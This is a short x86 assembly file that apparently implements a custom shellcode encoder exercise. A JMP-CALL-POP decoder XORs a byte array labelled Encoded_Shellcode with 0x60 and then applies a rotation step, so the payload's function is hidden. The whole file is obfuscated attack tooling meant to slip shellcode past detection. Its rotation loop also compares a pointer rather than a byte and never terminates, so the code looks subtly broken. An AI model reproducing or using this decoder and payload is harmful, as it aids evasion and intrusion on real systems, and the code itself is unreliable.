global _start
section .text
_start:

xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor esi, esi
xor edi, edi

jmp short call_main

decoder:
	pop esi
	mov edi, esi ; saving address of Shellcode

unxor:
	xor byte [esi], 0x60
	jz rot_127
	inc esi
	jmp short unxor

rot_127:
	cmp edi, 0x7F
	jl low
	sub edi, 0x7F
	jmp norm

low:
	xor ebx, ebx
	xor ecx, ecx
	mov bl, 0x60
	mov cl, 0xFF
	inc cx
	sub [edi], bl
	sub cx, bx
	mov [edi], cl

norm:
	inc edi
	jmp rot_127

call_main:
	call decoder
	Encoded_Shellcode: db 0xd0,0x1f,0xd0,0x3a,0xaf,0x89,0xe0,0x89,0xe1,0x4f,0x85,0x52,0xe0,0x68,0x00,0x2c,0x5f,0x75,0x4f,0x85,0x62,0x22,0xe1,0x87,0x9e,0x1e,0x1e,0x0e,0x85,0x87,0xc2,0x61,0x85,0x89,0xe1,0x68,0x00,0x89,0xef,0xb0,0xb5,0x68,0x00,0x2c,0x5f,0x75,0xd0,0x28,0x5f,0x20,0xe1,0x4f,0xde,0x2c,0x5f,0x1d,0x28,0x98,0x17,0xaf,0x87,0xce,0x99,0x92,0x87,0x87,0xce,0x81,0x88,0x8d,0x68,0x02,0xaf,0xb2,0x68,0x00,0x4f,0xea,0x2c,0x5f,0x60
